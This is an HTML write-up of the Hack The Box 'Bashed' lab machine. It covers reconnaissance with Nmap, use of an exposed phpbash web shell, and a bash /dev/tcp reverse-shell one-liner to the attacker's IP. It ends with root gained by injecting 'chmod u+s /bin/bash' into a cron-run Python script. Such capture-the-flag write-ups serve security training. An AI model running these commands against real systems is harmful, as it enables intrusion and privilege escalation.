@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Bashed Writeup | Diego Chávez</title>
+    <link rel="stylesheet" href="../../styles/global.css" />
+    <link rel="stylesheet" href="../../styles/button.css" />
+    <link rel="stylesheet" href="../../styles/about.css" />
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://api.iconify.design/simple-icons:hackthebox.svg?color=%23ff0000"
+    />
+    <style>
+      .writeup-img {
+        width: 100%;
+        max-width: 800px;
+        height: auto;
+        border-radius: 8px;
+        border: 1px solid rgba(89, 249, 255, 0.2);
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        margin: 12px 0;
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <main class="content-wrapper" style="max-width: 900px; margin: 0 auto; padding: 40px 20px;">
+      
+      <!-- ENCABEZADO Y ETIQUETAS -->
+      <section class="hero" style="text-align: left; margin-bottom: 40px;">
+        <h1 style="color: var(--link-hover-color); font-size: 2.3rem; margin-bottom: 10px;">HTB: Bashed</h1>
+        
+        <div class="tags" style="margin: 15px 0; display: flex; gap: 8px; flex-wrap: wrap;">
+          <span style="background: rgba(255,67,80,0.2); color: var(--link-active-1); padding: 4px 10px; border-radius: 5px; font-size: 0.85rem; font-weight: bold;">#Easy</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#linux</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#web</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#intrusion</span>
+        </div>
+      </section>
+
+      <!-- CONTENIDO DEL WRITEUP -->
+      <article class="writeup-body" style="line-height: 1.8; color: #e2e8f0; display: flex; flex-direction: column; gap: 25px;">
+        
+        <div class="step-card" style="background: rgba(22, 2, 61, 0.4); padding: 25px; border-radius: 12px; border: 1px solid rgba(89, 249, 255, 0.15);">
+          
+          <p>First, we launch an ICMP ping to verify if the target host is active.</p>
+          <img src="./images/Pasted image 20260406140439.png" alt="ICMP Ping Check" class="writeup-img" />
+          <p>Based on the TTL value of 63, we identify that the target machine is running Linux (close to TTL 64).</p>
+
+          <p style="margin-top: 15px;">Next, we perform port scanning using Nmap:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.14.180 -oG allPorts</code></pre>
+          <p style="margin-top: 10px;">The scan output confirms that port 80 (HTTP) is open:</p>
+          <img src="./images/Pasted image 20260406141007.png" alt="Nmap Open Port Scan Result" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We run service enumeration scripts against port 80:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">nmap -p80 -sCV 10.129.14.180 -oN targeted</code></pre>
+          <p style="margin-top: 10px;">Targeted scan results:</p>
+          <img src="./images/Pasted image 20260406141245.png" alt="Nmap Targeted Script Result" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We navigate to the web application running on port 80 (<code>http://10.129.14.180/</code>).</p>
+          <p style="margin-top: 10px;">Wappalyzer detection report:</p>
+          <img src="./images/Pasted image 20260406141517.png" alt="Wappalyzer Web Technology Report" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We run web path fuzzing using Nmap enumeration scripts:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">nmap -p80 --script http-enum 10.129.14.180 -oN webScan</code></pre>
+          <p style="margin-top: 10px;">The enumeration output discloses PHP directories, JavaScript files, and an <code>uploads</code> folder:</p>
+          <img src="./images/Pasted image 20260406141753.png" alt="Nmap HTTP Enum Output" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Browsing the discovered path reveals PHP files:</p>
+          <img src="./images/Pasted image 20260406142451.png" alt="Discovered Web Path Files" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Selecting <code>phpbash.php</code> grants access to an interactive web shell interface:</p>
+          <img src="./images/Pasted image 20260406142617.png" alt="phpbash Web Shell Interface" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We initiate a reverse shell connection back to our listener:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">bash -c 'bash -i >& /dev/tcp/10.10.16.167/443 0>&1'</code></pre>
+          <p style="margin-top: 10px;">Reverse shell established successfully:</p>
+          <img src="./images/Pasted image 20260406151626.png" alt="Reverse Shell Access Established" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We locate and retrieve the user flag (<code>user.txt</code>):</p>
+          <img src="./images/Pasted image 20260406152142.png" alt="User Flag Retrieval" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Checking user sudo privileges:</p>
+          <img src="./images/Pasted image 20260406152326.png" alt="User Sudo Privileges List" class="writeup-img" />
+          <p style="margin-top: 10px;">Privilege verification:</p>
+          <img src="./images/Pasted image 20260406152417.png" alt="Sudo Verification Check" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We spawn a shell as user <code>scriptmanager</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">sudo -u scriptmanager bash</code></pre>
+
+          <p style="margin-top: 15px;">Searching for files owned by <code>scriptmanager</code> across the filesystem:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">find / -user scriptmanager 2>/dev/null | grep -v "proc"</code></pre>
+          <p style="margin-top: 10px;">Output listing:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #e2e8f0;">/scripts
+/scripts/test.py
+/home/scriptmanager
+/home/scriptmanager/.profile
+/home/scriptmanager/.bashrc
+/home/scriptmanager/.nano
+/home/scriptmanager/.bash_history
+/home/scriptmanager/.bash_logout</code></pre>
+
+          <p style="margin-top: 15px;">Inspecting the contents of the <code>/scripts</code> directory:</p>
+          <img src="./images/Pasted image 20260406153225.png" alt="Scripts Directory Inspection" class="writeup-img" />
+          <p style="margin-top: 10px;">We note that output <code>.txt</code> files inside <code>/scripts</code> are owned by <code>root</code>, indicating periodic automated execution.</p>
+
+          <p style="margin-top: 15px;">To confirm periodic task execution, we create a process monitoring script inside <code>/tmp</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">#!/bin/bash
+
+old_process="$(ps -eo user,command)"
+
+while true; do
+	new_process="$(ps -eo user,command)"
+	diff &lt;(echo "$old_process") &lt;(echo "$new_process") | grep "[\&gt;\&gt;]" | grep -v "kworker|procmon"
+	old_process="$new_process"
+done</code></pre>
+
+          <p style="margin-top: 15px;">Monitoring active system processes:</p>
+          <img src="./images/Pasted image 20260406154759.png" alt="Process Monitor Execution" class="writeup-img" />
+          <p style="margin-top: 10px;">After a short interval, process diffing captures recurring task execution:</p>
+          <img src="./images/Pasted image 20260406155239.png" alt="Automated Cron Process Captured" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We edit <code>/scripts/test.py</code> to inject malicious Python code that sets SUID bits on Bash:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">import os
+
+os.system("chmod u+s /bin/bash")</code></pre>
+          
+          <p style="margin-top: 15px;">Modification saved:</p>
+          <img src="./images/Pasted image 20260406155549.png" alt="Python Script Modified" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Once the cron job executes, we run <code>bash -p</code> to elevate privileges to <strong>root</strong>:</p>
+          <img src="./images/Pasted image 20260406155723.png" alt="Root Shell Escalation Success" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Reading the root flag (<code>root.txt</code>):</p>
+          <img src="./images/Pasted image 20260406155802.png" alt="Root Flag Completed" class="writeup-img" />
+
+        </div>
+
+      </article>
+
+      <!-- BOTONES DE NAVEGACIÓN -->
+      <div class="button-container" style="margin-top: 40px; display: flex; justify-content: center; gap: 15px;">
+        <a href="writeups.html" class="button-33" role="button">Back to Writeups</a>
+        <a href="../../" class="button-33" role="button">Back home</a>
+      </div>
+
+    </main>
+  </body>
+</html>
